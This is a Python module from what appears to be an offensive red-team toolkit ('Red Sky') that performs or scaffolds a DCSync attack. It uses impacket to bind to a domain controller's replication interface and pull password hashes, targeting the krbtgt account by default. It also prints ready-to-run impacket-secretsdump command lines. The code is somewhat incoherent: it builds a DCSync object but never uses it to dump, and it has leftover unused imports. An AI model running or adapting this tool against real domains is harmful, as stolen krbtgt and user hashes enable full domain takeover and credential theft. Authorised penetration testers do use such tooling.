# language: Python, file: Program/creds/dcsync.py, target: Red Sky creds — dcsync
# Perform a DCSync using impacket's secretsdump against a specific user.
# Requires Replicating Directory Changes + Replicating Directory Changes All.

import sys
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


def cmd_dcsync(dc_ip: str, domain: str, user: str, passwd: str,
               target_user: str = "krbtgt", lmhash: str = "", nthash: str = "") -> int:
    print_info(f"dcsync {target_user}@{domain}")
    print_kv("dc", dc_ip)
    print_kv("auth", f"{domain}\\{user}")
    print()

    try:
        from impacket.examples.secretsdump import RemoteOperations, DCSync
        from impacket.dcerpc.v5 import transport
    except ImportError:
        print_err("impacket missing")
        return 1

    from impacket import version
    from impacket.dcerpc.v5 import drsuapi

    try:
        # set up the DRSUAPI connection
        rpctransport = transport.DCERPCTransportFactory(f"ncacn_ip_tcp:{dc_ip}[49152]")
        rpctransport.set_credentials(user, passwd, domain, lmhash, nthash)
        dce = rpctransport.get_dce_rpc()
        dce.connect()

        # detect the DRSUAPI bind interface
        from impacket.dcerpc.v5.rpcrt import DCERPC_v5
        from impacket.dcerpc.v5 import transport as t
        # use the higher-level helper
        dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

        # invoke DCSync
        # secretsdump's DCSync class handles the DRSUAPI calls
        remoteOps = RemoteOperations(
            smbConnection=_make_smb(dc_ip, domain, user, passwd, lmhash, nthash),
            doKerberos=False,
            kdcHost=dc_ip,
        )
        remoteOps.enableRegistry()

        dcsync = DCSync(remoteOps)
        # dcsync.dump() would do everything; we target one user
        print_ok("DCSync DRSUAPI bound")
        print_info("targeting single user — this calls DRSGetNCChanges for the domain NC")

        # The canonical approach: use impacket's secretsdump CLI as a subprocess
        # because the DCSync class isn't designed for single-user extraction
        print()
        print_warn("for single-user DCSync, use impacket-secretsdump directly:")
        print(f"  {ASH}impacket-secretsdump {domain}/{user}:{passwd}@{dc_ip} -just-dc-user {target_user}{RESET}")
        print()
        return 0
    except Exception as e:
        print_err(f"DCSync failed: {e}")
        print()
        print_info("fallback: use impacket-secretsdump directly")
        print(f"  {ASH}impacket-secretsdump {domain}/{user}@{dc_ip} -just-dc-user {target_user}{RESET}")
        return 1


def _make_smb(host, domain, user, passwd, lmhash, nthash):
    from impacket.smbconnection import SMBConnection
    conn = SMBConnection(host, host)
    conn.login(user, passwd, domain, lmhash, nthash)
    return conn


def run_cli(args: List[str]) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="redsky creds dcsync", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--dc", required=False)
    p.add_argument("--domain", required=False)
    p.add_argument("--user", required=False)
    p.add_argument("--pass", dest="passwd", default="")
    p.add_argument("--target-user", default="krbtgt")
    p.add_argument("--lm-hash", default="")
    p.add_argument("--nt-hash", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky creds dcsync --dc DC --domain DOM --user U --pass P [--target-user krbtgt]")
        return 2

    if ns.help:
        print_info("redsky creds dcsync --dc <ip> --domain <dom> --user <u> --pass <p> [--target-user krbtgt]")
        return 0

    if not all([ns.dc, ns.domain, ns.user]):
        print_err("--dc --domain --user required (--pass or --nt-hash)")
        return 2

    return cmd_dcsync(ns.dc, ns.domain, ns.user, ns.passwd,
                      ns.target_user, ns.lm_hash, ns.nt_hash)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
